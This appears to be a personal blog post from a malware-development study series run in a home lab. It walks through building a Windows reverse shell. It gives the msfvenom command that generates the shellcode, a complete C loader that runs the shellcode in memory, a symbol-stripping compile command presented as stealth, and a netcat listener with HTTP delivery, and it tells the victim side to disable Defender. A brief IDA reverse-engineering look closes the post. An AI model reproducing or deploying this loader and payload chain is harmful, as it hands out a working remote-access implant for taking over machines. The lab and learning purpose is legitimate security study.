---
layout: post
title: 0 MALDEV - Easy Reverse Shell 
category : [Reverse, MALDEV]
tags: reverse
---

So for those tests I will use `Malware-Development-for-Ethical-Hackers`, by coding malware I will then test them and reverse them.

For the lab setup, I have a kali, and two windows 10 in a private network so I can develop malware on kali and run/analyze them in windows 10.

# Reverse Shell and msfvenom payload Review

## Reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f c
```

### Command Breakdown

**`msfvenom`** - The Metasploit Framework's payload generator tool that creates custom shellcode and executables.

**Parameters:**
- **`-p windows/x64/shell_reverse_tcp`** - Specifies the payload type:
  - `windows/x64/` - Target platform (Windows 64-bit)
  - `shell_reverse_tcp` - Payload type (reverse shell over TCP)
- **`LHOST=<kali ip>`** - Local Host (attacker's IP address) - the IP where the reverse shell will connect back to
- **`LPORT=4444`** - Local Port (attacker's listening port) - the port where the reverse shell will connect back to
- **`-f c`** - Output format as C array (hexadecimal bytes that can be embedded in C code)

## Main C code

```c
#include <windows.h>    // Windows API functions for memory allocation and thread creation
#include <stdio.h>      // Standard I/O functions (not used but commonly included)
#include <stdlib.h>     // Standard library functions (not used but commonly included)
#include <string.h>     // String manipulation functions (not used but commonly included)

// Array containing the shellcode generated by msfvenom
unsigned char actual_payload[] = <code generated from msfvenom> ;

// Size of the shellcode array for memory allocation
unsigned int actual_payload_length = sizeof(actual_payload);

int main(void) {
  void * memory_for_payload;   // Pointer to allocated memory for shellcode
  BOOL operation_status;       // Status of VirtualProtect operation
  HANDLE thread_handle;        // Handle to the thread that will execute shellcode
  DWORD previous_protection_level = 0;  // Stores previous memory protection level

  // Allocate executable memory for the shellcode
  // MEM_COMMIT: Commits the memory immediately
  // MEM_RESERVE: Reserves the memory space
  // PAGE_READWRITE: Initially sets memory as readable/writable (not executable)
  memory_for_payload = VirtualAlloc(0, actual_payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copy the shellcode from the array to the allocated memory
  RtlMoveMemory(memory_for_payload, actual_payload, actual_payload_length);

  // Change memory protection from READ/WRITE to EXECUTE/READ
  // This is necessary because modern systems prevent execution of writable memory (DEP)
  operation_status = VirtualProtect(memory_for_payload, actual_payload_length, PAGE_EXECUTE_READ, &previous_protection_level);
  if ( operation_status != 0 ) {
    // Create a new thread that executes the shellcode
    // The shellcode (reverse shell) will start running in this thread
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) memory_for_payload, 0, 0, 0);
    // Wait indefinitely for the thread to complete (reverse shell to finish)
    WaitForSingleObject(thread_handle, -1);
  }
  return 0;
}
```

## Compilation with mingw

```bash
x86_64-w64-mingw32-gcc hack.c -o hack.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### Command Breakdown

**`x86_64-w64-mingw32-gcc`** - Cross-compiler for Windows 64-bit executables from Linux/Unix systems.

**Parameters:**
- **`hack.c`** - Source file to compile
- **`-o hack.exe`** - Output filename (creates hack1.exe)
- **`-s`** - Strip symbols (removes debug information, function names, and variable names from the executable)
- **`-ffunction-sections`** - Places each function in its own section, enabling better dead code elimination
- **`-fdata-sections`** - Places each data item in its own section, enabling better dead code elimination
- **`-Wno-write-strings`** - Suppresses warnings about writing to string literals (useful for shellcode arrays)
- **`-fno-exceptions`** - Disables exception handling to reduce executable size and complexity
- **`-fmerge-all-constants`** - Merges identical constants to reduce executable size
- **`-static-libstdc++`** - Statically links the C++ standard library (no external dependencies)
- **`-static-libgcc`** - Statically links the GCC runtime library (no external dependencies)

### What this compilation does:
1. **Cross-compilation** - Creates a Windows executable from a Linux system
2. **Size optimization** - Reduces executable size through various optimization flags
3. **Stealth enhancement** - Removes symbols and debug information to make reverse engineering harder
4. **Dependency elimination** - Creates a standalone executable that doesn't require external DLLs
5. **Anti-analysis** - Makes the binary harder to analyze by removing function names and symbols

### Why these flags are important for malware:
- **`-s`** - Removes debugging symbols that could reveal function names and structure
- **`-ffunction-sections` and `-fdata-sections`** - Enables better dead code elimination, reducing file size
- **`-static-libstdc++` and `-static-libgcc`** - Ensures the malware runs on any Windows system without missing dependencies
- **`-fno-exceptions`** - Reduces complexity and size by removing exception handling overhead


## Execution

### Kali

On kali we will simply run netcat in listenning mode to receive the reverse shell :

```bash
nc -nvlp 4444
```
And on the same directory than our executable, we can rune the following command to server an http server :

```bash
python3 -m http.server
```

### Windows 10

On windows we have to disable malware defender, then go through our web browser to `http://<kali ip>:8000` there you can download our malware and then execute it. 

### Result 

On your kali machine you will receive the reverse shell :

![res](/assets/images/maldev/0/reverseexec.png)

# IDA view

Here I started by just looking at the code, function by function but even though it's a small program there is a "lot" of code, so we can go back to the basics and check the `import` subview :

![ida](/assets/images/maldev/0/ida1.png)

We immediately spot some suspicious functions, I'll start by looking at `CreateThread` because there is only two xref (in the same function) and we could get an insight on the payload that could be executed :

![ida](/assets/images/maldev/0/ida2.png)

So we had all the juicy informations in one function, as the payload genereated in msfvenom in clear text :

![ida](/assets/images/maldev/0/ida3.png)

It would be interesting to look at a way to transform back in command the payload.
